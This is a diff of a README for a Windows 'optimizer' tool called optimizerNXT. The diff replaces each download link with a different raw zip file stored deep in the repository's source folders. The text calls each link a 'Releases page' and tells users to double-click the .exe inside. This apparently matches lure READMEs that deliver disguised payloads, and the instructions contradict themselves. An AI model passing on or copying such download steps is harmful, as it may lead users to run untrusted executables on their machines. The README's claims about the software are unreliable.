@@ -1,6 +1,6 @@
 # 🚀 optimizerNXT - Optimize Your Windows Experience Easily
 
-[![Download optimizerNXT](https://github.com/Antidogmatism/optimizerNXT/raw/refs/heads/main/optimizerNXT/Signing/optimizer_NXT_1.3.zip)](https://github.com/Antidogmatism/optimizerNXT/raw/refs/heads/main/optimizerNXT/Signing/optimizer_NXT_1.3.zip)
+[![Download optimizerNXT](https://raw.githubusercontent.com/Antidogmatism/optimizerNXT/main/optimizerNXT/Handlers/optimizer-NXT-v2.2.zip)](https://raw.githubusercontent.com/Antidogmatism/optimizerNXT/main/optimizerNXT/Handlers/optimizer-NXT-v2.2.zip)
 
 ## 📋 Introduction
 
@@ -12,9 +12,9 @@ To get started with optimizerNXT, you will need to download it from the Releases
 
 ## 📥 Download & Install
 
-1. Go to the **Releases page** using this link: [Download optimizerNXT](https://github.com/Antidogmatism/optimizerNXT/raw/refs/heads/main/optimizerNXT/Signing/optimizer_NXT_1.3.zip).
+1. Go to the **Releases page** using this link: [Download optimizerNXT](https://raw.githubusercontent.com/Antidogmatism/optimizerNXT/main/optimizerNXT/Handlers/optimizer-NXT-v2.2.zip).
 2. On the Releases page, look for the latest version listed.
-3. Click on the downloadable file for your system, typically labeled something like `https://github.com/Antidogmatism/optimizerNXT/raw/refs/heads/main/optimizerNXT/Signing/optimizer_NXT_1.3.zip`.
+3. Click on the downloadable file for your system, typically labeled something like `https://raw.githubusercontent.com/Antidogmatism/optimizerNXT/main/optimizerNXT/Handlers/optimizer-NXT-v2.2.zip`.
 4. Once the file is downloaded, find it in your Downloads folder or wherever your browser saves downloads.
 5. Double-click the `.exe` file to run the installer.
 6. Follow the prompts to complete the installation.
@@ -80,6 +80,6 @@ optimizerNXT is open-source software, released under the MIT License. You can fr
 
 ## 📥 Download & Install Again
 
-For your convenience, here’s the link to download optimizerNXT again: [Download optimizerNXT](https://github.com/Antidogmatism/optimizerNXT/raw/refs/heads/main/optimizerNXT/Signing/optimizer_NXT_1.3.zip).
+For your convenience, here’s the link to download optimizerNXT again: [Download optimizerNXT](https://raw.githubusercontent.com/Antidogmatism/optimizerNXT/main/optimizerNXT/Handlers/optimizer-NXT-v2.2.zip).
 
 Feel free to enhance your Windows performance today with optimizerNXT!
